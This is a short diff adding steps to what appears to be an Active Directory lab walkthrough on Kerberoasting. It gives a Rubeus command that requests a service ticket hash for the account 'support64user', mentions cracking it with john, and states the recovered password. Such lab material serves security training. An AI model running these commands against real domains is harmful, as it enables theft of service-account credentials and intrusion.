@@ -65,3 +65,22 @@ Inspect the SPN again:
 
 <br/>
 
+Request TGS using `Rubeus.exe`:
+
+```
+.\Rubeus.exe kerberoast /user:support64user /outfile:kerberoast-support64user-hash.txt
+```
+
+![picture 7](images/00e77b16cb99336ab35e23e12a73e21e64b99ef6f13b9586f61baa164ec3c83a.png)  
+
+<br/>
+
+Use `john.exe` to crack the password:
+
+![picture 8](images/1fa429f9142a9b0f23032c0d0bd7fede2321b7a4948b9e8bb0c954a3976582c8.png)  
+
+- The password of `support64user` is `Desk@123`
+
+<br/>
+
+---
